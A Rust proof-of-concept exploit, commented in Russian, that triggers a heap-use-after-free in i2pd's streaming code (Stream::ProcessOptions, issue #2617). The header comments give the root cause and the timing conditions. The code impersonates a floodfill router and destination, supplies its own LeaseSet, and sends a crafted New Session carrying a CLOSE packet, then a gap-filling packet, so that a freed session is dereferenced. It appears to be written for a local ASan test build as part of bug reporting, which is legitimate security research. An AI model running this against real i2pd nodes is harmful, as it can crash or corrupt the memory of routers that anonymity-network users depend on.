//! POC: i2pd ловит heap-use-after-free в `Stream::ProcessOptions`
//! (`Streaming.cpp:578`), issue #2617.
//!
//! ## Что ломаем
//!
//! `Stream::SavePacket` (`Streaming.cpp:406`) кладёт пакет в
//! `m_SavedPackets` вместе с `packet->from` — **сырым** указателем на
//! `ECIESX25519AEADRatchetSession`. Сессия живёт только внутри
//! `GarlicDestination::HandleGarlicMessage` (`Garlic.cpp:545-550`):
//!
//! 1. Приходит garlic с `New Session` от пира, с которым уже есть
//!    установленная сессия S2.
//! 2. `HandleGarlicMessage` создаёт временную сессию S и зовёт
//!    `HandleNewIncomingSession`.
//! 3. Тот зовёт `AddECIESx25519Session` (`Garlic.cpp:1108-1126`); та
//!    видит S2, `CanBeRestarted()` = false (S2 моложе
//!    `ECIESX25519_RESTART_TIMEOUT` = 120 c) и делает `return`, **не
//!    положив S в `m_ECIESx25519Sessions`**.
//! 4. `HandlePayload` всё равно обрабатывает клов (`ECIESX25519AEADRatchetSession.cpp:388-393`),
//!    и `packet->from` = S.
//! 5. Пакет идёт «с дыркой» по seqn → `SavePacket`, указатель на S
//!    сохранён.
//! 6. `HandleGarlicMessage` выходит — S освобождается.
//! 7. Пропущенный пакет приходит по живой S2 → цикл в
//!    `Stream::HandleNextPacket` (`Streaming.cpp:301-310`) достаёт
//!    сохранённый пакет → `ProcessPacket` → `ProcessOptions` →
//!    `memcmp(packet->from->GetRemoteStaticKey(), ...)` на
//!    освобождённой S.
//!
//! Противоположный случай i2pd уже закрыл: в
//! `StreamingDestination::HandleNextPacket` (`Streaming.cpp:2331`)
//! перед сохранением стоит `packet->from = nullptr;` с комментарием
//! «session might be invalid when saved packet gets handled». В
//! `Stream::SavePacket` такой строки нет.
//!
//! ## Роли
//!
//! Мы — destination D (сервер), i2pd — клиентский destination C за
//! HTTP-прокси. Схема:
//!
//! ```text
//!   curl -x http://127.0.0.1:4445 http://<D>.b32.i2p/
//!     → C спрашивает у нас (флудфилла) LeaseSet D
//!     → C шлёт NS к D, внутри clove I2NP Data со streaming-SYN
//!   ← NSR + SYNACK (seqn=0) по только что поднятой S2
//!   ← NS к C с нашим же static-ключом: clove Data, streaming seqn=2,
//!     flags = CLOSE                              (временная сессия S)
//!   ← existing-session по S2: streaming seqn=1   (закрывает дырку)
//! ```
//!
//! На шаге 3 i2pd видит уже существующую сессию с нашим static-ключом
//! (это S2, та самая, что подняла C к D) и выбрасывает S.
//!
//! Ключевые условия, без которых UAF не будет:
//!
//! - **CLOSE (или RESET) в сохранённом пакете**: только эта ветка
//!   `ProcessOptions` (`Streaming.cpp:568-586`) читает
//!   `packet->from->GetRemoteStaticKey()`.
//! - **У потока C есть `m_RemoteLeaseSet`**: для исходящего потока он
//!   выставляется прямо в конструкторе (`Streaming.cpp:115`) из
//!   `LeaseSet`, по которому шло подключение. Значит, i2pd обязан
//!   получить наш LS — иначе ветка уйдёт в `verified = true` без
//!   чтения.
//! - **Наш NS приходит не раньше чем через 200 мс** после предыдущего
//!   входящего NS: `INCOMING_SESSIONS_MINIMAL_INTERVAL`
//!   (`Garlic.h:58`), иначе i2pd вообще не станет разбирать NS.
//! - **S2 моложе 120 секунд**: иначе `CanBeRestarted()` = true, i2pd
//!   перезапустит сессию и S не освободится.
//!
//! ## Запуск
//!
//! ```text
//! UU_I2P_LIVE_RI=~/.local/opt/i2pd-uu/datadir/router.info \
//! UU_I2P_LIVE_SSU2=127.0.0.1:12345 \
//!     cargo run --example uu-i2p-poc-i2pd-streaming-uaf
//! ```
//!
//! Пример печатает b32-адрес и команду `curl` — её надо выполнить в
//! другом терминале.
//!
//! Лог i2pd: `/tmp/opencode/i2pd-ssu2.log`, ищем
//! `ERROR: AddressSanitizer: heap-use-after-free` и
//! `Streaming.cpp:578`.

use std::net::{IpAddr, Ipv4Addr, SocketAddr};
use std::time::{Duration, SystemTime, UNIX_EPOCH};

use tokio::net::UdpSocket;
use tokio::time::{Instant, timeout};
use tracing::{info, warn};
use tracing_subscriber::{EnvFilter, fmt};

use uu_i2p::{
    EciesGarlicClove, I2PTag, I2npMessage, I2npMessageType, IdentHash,
    config::{DEFAULT_NET_ID, DEFAULT_VERSION},
    crypto::{I2PX25519Keys, NoiseSymmetricState, init_noise_n_state},
    database_lookup::DatabaseLookup,
    database_store::DatabaseStore,
    ecies_destination::EciesGarlicDestination,
    ecies_ratchet::wrap_symmetric_message,
    error::{I2PError, Result},
    garlic_body::GarlicBody,
    lease::Lease,
    lease_set2::LeaseSet2,
    private_keys::I2PPrivateKeys,
    router_info::{FullRouterInfo, RouterInfo, RouterInfoCaps, ri_caps},
    router_info_address::I2PAddress,
    ssu2_pool::{Ssu2Event, Ssu2Local, Ssu2Pool},
    streaming::{
        FLAG_CLOSE, FLAG_SYNCHRONIZE, StreamingPacket, unwrap_data_message, wrap_data_message,
    },
    tunnel_messages::TunnelGatewayBody,
};

/// Сколько секунд ждём всей истории.
const DEFAULT_TIMEOUT_SECS: u64 = 120;

/// Время жизни нашего LS и lease, секунды.
const LEASE_TTL_SECS: u64 = 600;

/// Пауза перед нашим NS: i2pd игнорирует входящие NS чаще, чем раз в
/// `INCOMING_SESSIONS_MINIMAL_INTERVAL` = 200 мс (`Garlic.h:58`).
const NS_DELAY_MS: u64 = 300;

fn now_ms() -> u64 {
    u64::try_from(
        SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .expect("system clock before epoch")
            .as_millis(),
    )
    .expect("milliseconds since epoch exceed u64")
}

fn now_secs() -> u32 {
    u32::try_from(now_ms() / 1000).unwrap_or(u32::MAX)
}

fn init_tracing() {
    let _ = fmt()
        .with_env_filter(EnvFilter::from_default_env())
        .try_init();
}

/// Первые 8 байт ключа в hex — для логов.
fn hex8(bytes: &[u8; 32]) -> String {
    use std::fmt::Write as _;
    let mut out = String::with_capacity(16);
    for b in &bytes[..8] {
        let _ = write!(out, "{b:02x}");
    }
    out
}

/// Короткое имя garlic-блока для логов (без дампа payload'а).
fn block_kind(block: &uu_i2p::garlic_block::GarlicBlock) -> String {
    match block {
        uu_i2p::garlic_block::GarlicBlock::EciesGarlicClove(c) => {
            format!("clove {:?} {} байт", c.message_type, c.payload.len())
        }
        other => format!("{other:?}"),
    }
}

/// `[u8; 32]` из среза (для ключей `I2PPrivateKeys`).
fn array32(bytes: &[u8]) -> [u8; 32] {
    bytes.try_into().expect("expected 32 bytes")
}

struct Args {
    ri_path: String,
    addr_override: Option<SocketAddr>,
}

fn parse_args() -> Args {
    let ri_path = std::env::args()
        .nth(1)
        .or_else(|| std::env::var("UU_I2P_LIVE_RI").ok());
    let Some(ri_path) = ri_path else {
        eprintln!(
            "usage: uu-i2p-poc-i2pd-streaming-uaf <router.info> [host:port]\n\
             \n\
             (или UU_I2P_LIVE_RI=/path/to/router.info, UU_I2P_LIVE_SSU2=host:port)"
        );
        std::process::exit(1);
    };
    let addr_override = std::env::args()
        .nth(2)
        .or_else(|| std::env::var("UU_I2P_LIVE_SSU2").ok())
        .map(|s| s.parse::<SocketAddr>().expect("host:port"));
    Args {
        ri_path,
        addr_override,
    }
}

/// Ждёт `Established`, попутно логируя прочие события.
async fn wait_established(pool: &Ssu2Pool) -> IdentHash {
    let deadline = Instant::now() + Duration::from_secs(20);
    loop {
        let remaining = deadline.saturating_duration_since(Instant::now());
        match timeout(remaining, pool.next_event())
            .await
            .expect("timeout waiting for Established")
            .expect("pool event")
        {
            Ssu2Event::Established { ident } => return ident,
            Ssu2Event::Disconnected { ident } => panic!("disconnected from {}", ident.to_base64()),
            other => info!(?other, "event (before Established)"),
        }
    }
}

/// Расшифровывает роутерный ECIES-garlic (Noise «N»), которым i2pd
/// отправляет `DatabaseLookup` флудфиллу.
fn decrypt_router_garlic(
    static_priv: &[u8; 32],
    static_pub: &[u8; 32],
    wire: &[u8],
) -> Result<Vec<u8>> {
    if wire.len() < 32 + 16 {
        return Err(I2PError::InvalidLength {
            expected: 48,
            got: wire.len(),
        });
    }
    let mut aepk = [0u8; 32];
    aepk.copy_from_slice(&wire[..32]);

    let mut noise = NoiseSymmetricState::new(&[0u8; 32], &[0u8; 32], static_pub);
    init_noise_n_state(&mut noise, static_pub);
    noise.mix_hash(&aepk);
    let keys = I2PX25519Keys::from_private(static_priv, Some(static_pub));
    let shared = keys
        .agree(&aepk)
        .ok_or(I2PError::Malformed("poc: x25519 agree failed"))?;
    noise.mix_key(&shared);

    let mut plain = vec![0u8; wire.len() - 32 - 16];
    let len = noise.decrypt(&wire[32..], &mut plain)?;
    plain.truncate(len);
    Ok(plain)
}

/// Всё, что нужно знать о потоке после SYN от i2pd.
///
/// Идентификаторы в streaming-пакете идут «крест-накрест»:
/// `sendStreamID` — id **отправителя** (наш), `receiveStreamID` — id
/// **получателя** (тот, что i2pd ждёт от нас).
struct StreamCtx {
    /// Наш `sendStreamID` — ровно `receiveStreamID` из SYN i2pd: под
    /// этим ключом его поток лежит в `m_Streams`
    /// (`Streaming.cpp:2363`, `m_Streams.emplace(s->GetRecvStreamID(), s)`).
    send_sid: u32,
    /// Наш `receiveStreamID` — его i2pd возьмёт себе в `m_SendStreamID`
    /// из нашего SYNACK (`Streaming.cpp:229`).
    recv_sid: u32,
    /// Порт источника в Data-сообщении (наш порт).
    from_port: u16,
    /// Порт назначения в Data-сообщении (порт i2pd).
    to_port: u16,
}

/// Состояние POC: SSU2-пул, наш destination и его `LeaseSet`.
struct Poc {
    pool: Ssu2Pool,
    /// Наша сторона Bob'а: сессии, которые поднимает i2pd.
    dest: EciesGarlicDestination,
    /// Наш static-ключ — тот же, что в `LeaseSet`'е.
    dest_static_priv: [u8; 32],
    dest_static_pub: [u8; 32],
    dest_ident: IdentHash,
    dest_ls: LeaseSet2,
    router_priv: [u8; 32],
    router_pub: [u8; 32],
}

impl Poc {
    /// Отправляет garlic-wire через `TunnelGateway` на lease пира.
    async fn send_tunneled(&self, lease: &Lease, wire: Vec<u8>) -> Result<()> {
        let garlic = I2npMessage::new(I2npMessageType::Garlic, GarlicBody::new(wire).to_buffer()?);
        let gw = TunnelGatewayBody {
            tunnel_id: lease.tunnel_id,
            data: garlic.to_buffer()?,
        };
        self.pool
            .send_to(
                &lease.tunnel_gateway,
                I2npMessage::new(I2npMessageType::TunnelGateway, gw.to_buffer()?),
            )
            .await
    }

    /// Обрабатывает garlic от роутера i2pd: отвечаем на `DatabaseLookup`
    /// за наш `LeaseSet`.
    async fn handle_router_garlic(&self, payload: &[u8]) -> Result<()> {
        let body = GarlicBody::from_buffer(payload)?;
        let plain = decrypt_router_garlic(&self.router_priv, &self.router_pub, &body.payload)?;
        let blocks = uu_i2p::garlic_block::parse_blocks(&plain)?;
        println!(
            "garlic от роутера: {} блок(ов), plain={} байт",
            blocks.len(),
            plain.len()
        );
        for block in blocks {
            println!("  блок: {}", block_kind(&block));
            let uu_i2p::garlic_block::GarlicBlock::EciesGarlicClove(clove) = block else {
                continue;
            };
            if clove.message_type != I2npMessageType::DatabaseLookup {
                continue;
            }
            let lookup = DatabaseLookup::from_buffer(&clove.payload)?;
            println!(
                "DatabaseLookup: key={} from={} reply_tunnel={:?}",
                lookup.key.to_base32(),
                lookup.from.to_base64(),
                lookup.reply_tunnel_id
            );
            if lookup.key != self.dest_ident {
                println!("  ищут не нас — пропускаем");
                continue;
            }
            self.answer_lookup(&lookup).await?;
            println!("  ждём NS от destination'а i2pd…");
            return Ok(());
        }
        println!("garlic от роутера без нужного нам DatabaseLookup — пропускаем");
        Ok(())
    }

    /// Обрабатывает «прямой» I2NP `DatabaseLookup` (без garlic).
    async fn handle_lookup(&self, payload: &[u8]) -> Result<()> {
        let lookup = DatabaseLookup::from_buffer(payload)?;
        println!(
            "DatabaseLookup: key={} from={} reply_tunnel={:?} excluded={}",
            lookup.key.to_base32(),
            lookup.from.to_base64(),
            lookup.reply_tunnel_id,
            lookup.excluded.len()
        );
        if lookup.key != self.dest_ident {
            println!("  ищут не нас — пропускаем");
            return Ok(());
        }
        self.answer_lookup(&lookup).await
    }

    /// Отвечает на `DatabaseLookup` нашим `LeaseSet2`.
    async fn answer_lookup(&self, lookup: &DatabaseLookup) -> Result<()> {
        let Some(enc) = &lookup.encrypted_reply else {
            return Err(I2PError::Malformed(
                "poc: DatabaseLookup without encrypted reply",
            ));
        };
        let Some(tag_bytes) = enc.tags.first() else {
            return Err(I2PError::Malformed("poc: DatabaseLookup without reply tag"));
        };
        let tag = u64::from_le_bytes(
            <[u8; 8]>::try_from(tag_bytes.as_slice())
                .map_err(|_| I2PError::Malformed("poc: reply tag must be 8 bytes"))?,
        );

        let store = DatabaseStore::new_lease_set2(self.dest_ident, self.dest_ls.to_buffer()?);
        let store_msg = I2npMessage::new(I2npMessageType::DatabaseStore, store.to_buffer()?);
        let clove = EciesGarlicClove::wrap_local(&store_msg);
        let wire = wrap_symmetric_message(&enc.session_key, tag, &[clove])?;

        let garlic = I2npMessage::new(I2npMessageType::Garlic, GarlicBody::new(wire).to_buffer()?);
        let total = garlic.total_len();
        let Some(tunnel_id) = lookup.reply_tunnel_id else {
            println!("  reply без туннеля — отвечаем прямым Garlic");
            self.pool.send_to(&lookup.from, garlic).await?;
            println!("  LeaseSet отправлен ({total} байт)");
            return Ok(());
        };
        let gw = TunnelGatewayBody {
            tunnel_id,
            data: garlic.to_buffer()?,
        };
        self.pool
            .send_to(
                &lookup.from,
                I2npMessage::new(I2npMessageType::TunnelGateway, gw.to_buffer()?),
            )
            .await?;
        println!("  LeaseSet2 отправлен в reply-туннель {tunnel_id} ({total} байт)");
        Ok(())
    }

    /// Обрабатывает `TunnelGateway` от i2pd: NS с SYN внутри.
    ///
    /// Возвращает `true`, если триггер отправлен.
    async fn handle_gateway(&mut self, payload: &[u8]) -> Result<bool> {
        let gw = TunnelGatewayBody::from_buffer(payload)?;
        let inner = I2npMessage::from_buffer(&gw.data)?;
        println!(
            "TunnelGateway: tunnel_id={} внутри {:?} {} байт",
            gw.tunnel_id,
            inner.message_type(),
            inner.payload().len()
        );
        if inner.message_type() != I2npMessageType::Garlic {
            return Ok(false);
        }
        let body = GarlicBody::from_buffer(inner.payload())?;
        let res = self.dest.handle_message(&body.payload)?;
        println!(
            "ECIES: remote_static=…{} needs_reply={} terminated={} cloves={}",
            hex8(&res.remote_static),
            res.needs_reply,
            res.terminated,
            res.blocks.len()
        );
        if !res.needs_reply {
            println!("  это не NS — ждём дальше");
            return Ok(false);
        }

        // 1. Ищем SYN и LeaseSet i2pd'шного destination'а.
        let Some(ctx) = Self::stream_from_blocks(&res.blocks)? else {
            warn!("в NS не было streaming-SYN — нечего ломать");
            return Ok(false);
        };
        let Some(lease) = Self::i2pd_lease(&res.blocks)? else {
            warn!("в NS не было приложенного LeaseSet i2pd — некуда отвечать");
            return Ok(false);
        };
        // Static-ключ i2pd — прямо из NS (см. `i2pd_lease`).
        let peer_static = res.remote_static;
        println!(
            "SYN: rSID i2pd={} порты {}/{}; static i2pd=…{}",
            ctx.send_sid,
            ctx.from_port,
            ctx.to_port,
            hex8(&peer_static)
        );

        // 2. NSR: без него у i2pd не будет send-tagset для нашей S2.
        let nsr = self.dest.send_blocks(res.remote_static, now_ms(), &[])?;
        println!("NSR: {} байт → lease i2pd", nsr.len());
        self.send_tunneled(&lease, nsr).await?;

        // 3. SYNACK (seqn=0) — он же выставляет
        //    `m_LastReceivedSequenceNumber = 0` на стороне i2pd.
        self.send_stream_packet(&lease, &ctx, 0, FLAG_SYNCHRONIZE, res.remote_static)
            .await?;
        println!("SYNACK: seqn=0 sSID={} rSID={}", ctx.send_sid, ctx.recv_sid);

        // 4. Даём i2pd «остыть»: входящие NS чаще 200 мс не разбираются.
        tokio::time::sleep(Duration::from_millis(NS_DELAY_MS)).await;

        // 5. NS через **новую** initiator-сессию с нашим же static-ключом.
        //    i2pd создаст временную сессию S, увидит уже существующую S2
        //    (моложе 120 c) и выбросит S.
        //
        //    Пакет seqn=2 с FLAG_CLOSE «с дыркой» ложится в
        //    `m_SavedPackets` вместе с `packet->from = S`.
        let mut initiator = EciesGarlicDestination::new(I2PX25519Keys::from_private(
            &self.dest_static_priv,
            Some(&self.dest_static_pub),
        ));
        let close_packet = Self::stream_packet_bytes(&ctx, 2, FLAG_CLOSE);
        let clove = Self::data_clove(&close_packet, &ctx)?;
        let ns = initiator.send_blocks(peer_static, now_ms(), &[clove])?;
        println!("NS с seqn=2|CLOSE: {} байт → lease i2pd", ns.len());
        self.send_tunneled(&lease, ns).await?;

        // 6. Теперь закрываем дырку по живой S2: seqn=1.
        self.send_stream_packet(&lease, &ctx, 1, 0, res.remote_static)
            .await?;
        println!("existing-session с seqn=1 отправлен — ждём UAF в i2pd");

        Ok(true)
    }

    /// Собирает байты streaming-пакета в наш поток.
    fn stream_packet_bytes(ctx: &StreamCtx, seqn: u32, flags: u16) -> Vec<u8> {
        let mut p = StreamingPacket::new(ctx.send_sid, ctx.recv_sid);
        p.seqn = seqn;
        // ackThrough: подтверждаем то, что реально получили.
        p.ack_through = 0;
        p.resend_delay = 2;
        p.flags = flags;
        p.to_bytes().expect("streaming packet")
    }

    /// Отправляет streaming-пакет по уже установленной сессии S2.
    async fn send_stream_packet(
        &mut self,
        lease: &Lease,
        ctx: &StreamCtx,
        seqn: u32,
        flags: u16,
        remote_static: [u8; 32],
    ) -> Result<()> {
        let packet = Self::stream_packet_bytes(ctx, seqn, flags);
        let clove = Self::data_clove(&packet, ctx)?;
        let wire = self.dest.send_blocks(remote_static, now_ms(), &[clove])?;
        self.send_tunneled(lease, wire).await
    }

    /// Оборачивает streaming-пакет в клов `I2NP Data`.
    fn data_clove(packet: &[u8], ctx: &StreamCtx) -> Result<EciesGarlicClove> {
        let data = wrap_data_message(packet, ctx.from_port, ctx.to_port)?;
        let msg = I2npMessage::new(I2npMessageType::Data, data);
        Ok(EciesGarlicClove::wrap_local(&msg))
    }

    /// Достаёт SYN из кловов NS и строит [`StreamCtx`].
    fn stream_from_blocks(blocks: &[EciesGarlicClove]) -> Result<Option<StreamCtx>> {
        for clove in blocks {
            println!(
                "  clove: {:?} {} байт",
                clove.message_type,
                clove.payload.len()
            );
            if clove.message_type != I2npMessageType::Data {
                continue;
            }
            let data = unwrap_data_message(&clove.payload)?;
            let (syn, _) = StreamingPacket::from_buffer(&data.payload)?;
            if !syn.is_syn() || syn.send_stream_id != 0 {
                println!("  Data без SYN (flags={:#x}) — пропускаем", syn.flags);
                continue;
            }
            return Ok(Some(StreamCtx {
                send_sid: syn.receive_stream_id,
                recv_sid: rand::random::<u32>(),
                from_port: data.to_port,
                to_port: data.from_port,
            }));
        }
        Ok(None)
    }

    /// Достаёт lease destination'а i2pd из приложенного к NS
    /// `DatabaseStore`-клова.
    ///
    /// Static-ключ i2pd здесь не нужен: он уже есть в
    /// [`uu_i2p::ecies_destination::HandleResult::remote_static`] —
    /// `HandlePayload` достаёт его из самого NS
    /// (`ECIESX25519AEADRatchetSession.cpp:388`). Из `LeaseSet`'а
    /// берём только lease, чтобы знать, в какой туннель отвечать.
    fn i2pd_lease(blocks: &[EciesGarlicClove]) -> Result<Option<Lease>> {
        for clove in blocks {
            if clove.message_type != I2npMessageType::DatabaseStore {
                continue;
            }
            let store = DatabaseStore::from_buffer(&clove.payload)?;
            let ls = LeaseSet2::from_buffer(&store.payload_decoded()?)?;
            println!(
                "  LeaseSet2 i2pd: {} lease(ов), expires={}s",
                ls.leases().len(),
                ls.expires()
            );
            if let Some(lease) = ls.leases().first() {
                return Ok(Some(*lease));
            }
        }
        Ok(None)
    }

    /// Крутит события пула до победы или таймаута.
    async fn run(&mut self, secs: u64) -> Result<()> {
        let deadline = Instant::now() + Duration::from_secs(secs);
        loop {
            let remaining = deadline.saturating_duration_since(Instant::now());
            if remaining.is_zero() {
                println!("Таймаут: i2pd так и не дошёл до NS. Проверь лог i2pd.");
                return Ok(());
            }
            let event = match timeout(remaining, self.pool.next_event()).await {
                Ok(Ok(event)) => event,
                Ok(Err(e)) => return Err(e),
                Err(_) => {
                    println!("Таймаут: i2pd так и не дошёл до NS. Проверь лог i2pd.");
                    return Ok(());
                }
            };
            match event {
                Ssu2Event::Message { from, message } => {
                    println!(
                        "I2NP от {}: {:?} {} байт",
                        from.to_base64(),
                        message.message_type(),
                        message.payload().len()
                    );
                    let done = match message.message_type() {
                        I2npMessageType::Garlic => {
                            self.handle_router_garlic(message.payload()).await?;
                            false
                        }
                        // i2pd шлёт lookup флудфиллу и «прямым» I2NP
                        // (когда сессия уже есть), и garlic'ом —
                        // обрабатываем оба вида.
                        I2npMessageType::DatabaseLookup => {
                            self.handle_lookup(message.payload()).await?;
                            false
                        }
                        I2npMessageType::TunnelGateway => {
                            self.handle_gateway(message.payload()).await?
                        }
                        _ => false,
                    };
                    if done {
                        return Ok(());
                    }
                }
                Ssu2Event::Disconnected { ident } => {
                    println!("i2pd закрыл сессию с {}", ident.to_base64());
                    return Ok(());
                }
                other => info!(?other, "event"),
            }
        }
    }
}

/// Готовое к работе состояние.
struct Prepared {
    poc: Poc,
    ri_bytes: Vec<u8>,
    addr_override: Option<SocketAddr>,
    i2pd: IdentHash,
}

/// Наш `RouterInfo` — флудфилл с published SSU2v4-адресом на loopback.
///
/// Loopback обязателен: i2pd рвёт `SessionConfirmed`, если опубликованный
/// хост не равен адресу сессии (`SSU2Session.cpp:1400`), а сессия идёт
/// через 127.0.0.1. Проходит только потому, что в конфиге стенда
/// `reservedrange = false`.
fn build_local(
    port: u16,
    static_keys: I2PX25519Keys,
    intro_key: [u8; 32],
) -> Result<(Ssu2Local, I2PPrivateKeys)> {
    let keys = I2PPrivateKeys::generate_default()?;
    let address = I2PAddress::ssu2_published(
        IpAddr::V4(Ipv4Addr::LOCALHOST),
        port,
        I2PTag::from_array(*static_keys.public_key()),
        I2PTag::from_array(intro_key),
    );
    let caps = RouterInfoCaps {
        bits: ri_caps::FLOODFILL,
        ..RouterInfoCaps::default()
    };
    let body = RouterInfo::builder()
        .timestamp(now_ms())
        .add_address(address)
        .caps(caps)
        .version(DEFAULT_VERSION)
        .net_id(i32::from(DEFAULT_NET_ID))
        .build();
    let ri_bytes = FullRouterInfo::from_keys(&keys, body)?.to_buffer()?;
    let local = Ssu2Local::new(static_keys, intro_key, ri_bytes, DEFAULT_NET_ID, false)?;
    Ok((local, keys))
}

/// Собирает ключи, `RouterInfo`, фейковый destination и его `LeaseSet`.
async fn prepare(args: &Args) -> Prepared {
    let ri_bytes = std::fs::read(&args.ri_path).expect("read RouterInfo");
    let remote_ri = FullRouterInfo::from_buffer(&ri_bytes).expect("parse RouterInfo");
    let i2pd = *remote_ri.ident_hash();

    let socket = UdpSocket::bind("127.0.0.1:0").await.expect("bind udp");
    let local_addr = socket.local_addr().expect("local_addr");
    let static_keys = I2PX25519Keys::generate();
    let intro: [u8; 32] = rand::random();
    let (local, router_keys) =
        build_local(local_addr.port(), static_keys, intro).expect("build our RouterInfo");
    let router_priv = array32(router_keys.crypto_private());
    let router_pub = array32(
        router_keys
            .public()
            .encryption_public_key()
            .expect("router encryption key"),
    );
    let ours = *router_keys.public().ident_hash();
    let pool = Ssu2Pool::with_socket(socket, local).expect("Ssu2Pool");

    // Destination и его LeaseSet: lease указывает на нас.
    let dest_keys = I2PPrivateKeys::generate_default().expect("generate dest keys");
    let dest_ident = *dest_keys.public().ident_hash();
    let dest_static_pub = array32(
        dest_keys
            .public()
            .encryption_public_key()
            .expect("dest encryption key"),
    );
    let dest_static_priv = array32(dest_keys.crypto_private());
    let dest_static = I2PX25519Keys::from_private(&dest_static_priv, Some(&dest_static_pub));
    let tunnel_id = rand::random::<u32>() | 1;
    let dest_ls = LeaseSet2::builder()
        .published_timestamp(now_secs())
        .expires(u16::try_from(LEASE_TTL_SECS).expect("lease ttl"))
        .add_lease(Lease::new(
            ours,
            tunnel_id,
            (u64::from(now_secs()) + LEASE_TTL_SECS) * 1000,
        ))
        .build(&dest_keys)
        .expect("build LeaseSet2");

    println!("Наш роутер:      {}", ours.to_base64());
    println!("Наш destination: {}", dest_ident.to_base64());
    println!("Адрес:           {}.b32.i2p", dest_ident.to_base32());
    println!("Published:       {}:{}", local_addr.ip(), local_addr.port());
    println!();
    println!("=== Триггер: попросить i2pd сходить на наш destination ===");
    println!(
        "curl -x http://127.0.0.1:4445 --max-time 20 http://{}.b32.i2p/",
        dest_ident.to_base32()
    );
    println!();

    Prepared {
        poc: Poc {
            pool,
            dest: EciesGarlicDestination::new(dest_static),
            dest_static_priv,
            dest_static_pub,
            dest_ident,
            dest_ls,
            router_priv,
            router_pub,
        },
        ri_bytes,
        addr_override: args.addr_override,
        i2pd,
    }
}

/// Что должно появиться в логе i2pd, если POC сработал.
fn print_expectations() {
    println!();
    println!("=== Что должно быть в логе i2pd ===");
    println!("Garlic: ECIESx25519 session with static key … already exists");
    println!("AddressSanitizer: heap-use-after-free (READ of size 32)");
    println!("    #0 ... memcmp");
    println!("    #1 libi2pd::streaming::Stream::ProcessOptions  Streaming.cpp:578");
    println!("    #2 libi2pd::streaming::Stream::ProcessPacket");
    println!("    #3 libi2pd::streaming::Stream::HandleNextPacket");
    println!();
    println!(
        "grep -a \"already exists\\|heap-use-after-free\\|Streaming.cpp\" /tmp/opencode/i2pd-ssu2.log | tail"
    );
}

#[tokio::main]
async fn main() {
    init_tracing();
    let args = parse_args();
    println!("=== POC: i2pd streaming Stream::ProcessOptions UAF (#2617) ===");
    println!("RouterInfo i2pd: {}", args.ri_path);
    let Prepared {
        mut poc,
        ri_bytes,
        addr_override,
        i2pd,
    } = prepare(&args).await;

    let ident = timeout(Duration::from_secs(20), async {
        match addr_override {
            Some(addr) => poc.pool.connect_to(&ri_bytes, addr).await,
            None => poc.pool.connect(&ri_bytes).await,
        }
    })
    .await
    .expect("connect timeout")
    .expect("connect failed");
    assert_eq!(ident, i2pd, "connected to a different router");
    let _ = wait_established(&poc.pool).await;
    println!("SSU2: соединение с i2pd установлено, ждём запрос LeaseSet'а...");

    if let Err(e) = poc.run(DEFAULT_TIMEOUT_SECS).await {
        eprintln!("ошибка: {e}");
        std::process::exit(1);
    }
    let _ = poc.pool.close(&i2pd).await;
    print_expectations();
}
